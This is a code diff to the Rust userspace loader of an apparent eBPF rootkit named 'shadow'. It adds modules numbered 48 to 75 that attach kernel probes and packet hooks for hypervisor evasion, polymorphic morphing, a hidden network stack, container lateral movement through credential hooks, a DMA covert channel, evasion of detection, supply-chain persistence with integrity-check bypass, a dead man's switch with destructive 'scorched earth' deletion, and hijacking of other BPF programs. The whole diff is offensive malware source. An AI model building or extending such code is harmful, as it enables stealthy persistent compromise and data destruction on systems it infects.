@@ -897,6 +897,238 @@ async fn main() -> Result<()> {
         info!("✓ Feature 47: BPF Link Pinning attached");
     }
 
+    // ── Features 48-51: Hypervisor Evasion ──
+    if cli.enable_hypervisor_evasion {
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_cpuid_intercept")
+            .context("shadow_cpuid_intercept not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("kvm_emulate_cpuid", 0)?;
+
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_hypercall_detect")
+            .context("shadow_hypercall_detect not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("kvm_hypercall", 0)?;
+
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_nmi_handler")
+            .context("shadow_nmi_handler not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("exc_nmi", 0)?;
+
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_tsc_khz_changed")
+            .context("shadow_tsc_khz_changed not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("tsc_khz_changed", 0)?;
+        info!("✓ Features 48-51: Hypervisor Evasion attached");
+    }
+
+    // ── Features 52-54: Polymorphic Engine ──
+    if cli.enable_polymorphic {
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_bpf_prog_morph")
+            .context("shadow_bpf_prog_morph not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("bpf_prog_load", 0)?;
+
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_pattern_rotate")
+            .context("shadow_pattern_rotate not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("__schedule", 0)?;
+
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_opaque_predicate")
+            .context("shadow_opaque_predicate not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("bpf_check", 0)?;
+        info!("✓ Features 52-54: Polymorphic Engine attached");
+    }
+
+    // ── Features 55-57: Phantom Network Stack ──
+    if cli.enable_phantom_stack {
+        let prog: &mut Xdp = bpf
+            .program_mut("shadow_phantom_ingress")
+            .context("shadow_phantom_ingress not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach(&cli.iface, XdpFlags::default())?;
+
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_phantom_state")
+            .context("shadow_phantom_state not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("tcp_rcv_state_process", 0)?;
+
+        let prog: &mut SchedClassifier = bpf
+            .program_mut("shadow_phantom_egress")
+            .context("shadow_phantom_egress not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach(&cli.iface, TcAttachType::Egress)?;
+        info!("✓ Features 55-57: Phantom Network Stack attached");
+    }
+
+    // ── Features 58-60: Container Lateral Movement ──
+    if cli.enable_container_lateral {
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_cgroup_bpf_attach")
+            .context("shadow_cgroup_bpf_attach not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("cgroup_bpf_prog_attach", 0)?;
+
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_switch_namespaces")
+            .context("shadow_switch_namespaces not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("switch_task_namespaces", 0)?;
+
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_commit_creds_ns")
+            .context("shadow_commit_creds_ns not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("commit_creds", 0)?;
+        info!("✓ Features 58-60: Container Lateral Movement attached");
+    }
+
+    // ── Features 61-63: DMA Covert Channel ──
+    if cli.enable_dma_covert {
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_iommu_map")
+            .context("shadow_iommu_map not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("iommu_map", 0)?;
+
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_pci_config_read")
+            .context("shadow_pci_config_read not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("pci_read_config_dword", 0)?;
+
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_ndo_start_xmit")
+            .context("shadow_ndo_start_xmit not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("ndo_start_xmit", 0)?;
+        info!("✓ Features 61-63: DMA Covert Channel attached");
+    }
+
+    // ── Features 64-66: Behavioral AI Camouflage ──
+    if cli.enable_behavioral_ai {
+        let prog: &mut TracePoint = bpf
+            .program_mut("shadow_syscall_profile")
+            .context("shadow_syscall_profile not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("raw_syscalls", "sys_enter")?;
+
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_activity_throttle")
+            .context("shadow_activity_throttle not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("__schedule", 0)?;
+
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_norm_avoidance")
+            .context("shadow_norm_avoidance not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("__schedule", 0)?;
+        info!("✓ Features 64-66: Behavioral AI Camouflage attached");
+    }
+
+    // ── Features 67-69: Supply Chain Persistence ──
+    if cli.enable_supply_chain {
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_execve_supply")
+            .context("shadow_execve_supply not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("do_execveat_common", 0)?;
+
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_vfs_read_supply")
+            .context("shadow_vfs_read_supply not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("vfs_read", 0)?;
+
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_integrity_bypass")
+            .context("shadow_integrity_bypass not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("security_file_open", 0)?;
+        info!("✓ Features 67-69: Supply Chain Persistence attached");
+    }
+
+    // ── Features 70-72: Dead Man's Switch ──
+    if cli.enable_deadman_switch {
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_udp_heartbeat")
+            .context("shadow_udp_heartbeat not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("udp_rcv", 0)?;
+
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_deadman_check")
+            .context("shadow_deadman_check not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("hrtimer_interrupt", 0)?;
+
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_scorched_earth")
+            .context("shadow_scorched_earth not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("vfs_unlink", 0)?;
+        info!("✓ Features 70-72: Dead Man's Switch attached");
+    }
+
+    // ── Features 73-75: BPF Parasitism ──
+    if cli.enable_bpf_parasitism {
+        let prog: &mut TracePoint = bpf
+            .program_mut("shadow_bpf_prog_scan")
+            .context("shadow_bpf_prog_scan not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("syscalls", "sys_enter_bpf")?;
+
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_tailcall_inject")
+            .context("shadow_tailcall_inject not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("bpf_prog_array_copy", 0)?;
+
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_prog_array_hijack")
+            .context("shadow_prog_array_hijack not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("bpf_map_update_elem", 0)?;
+        info!("✓ Features 73-75: BPF Parasitism attached");
+    }
+
     // Populate OWN_PROG_IDS for cloaking (after all programs are loaded)
     if cli.enable_bpf_cloak {
         let prog_ids: Vec<u32> = bpf
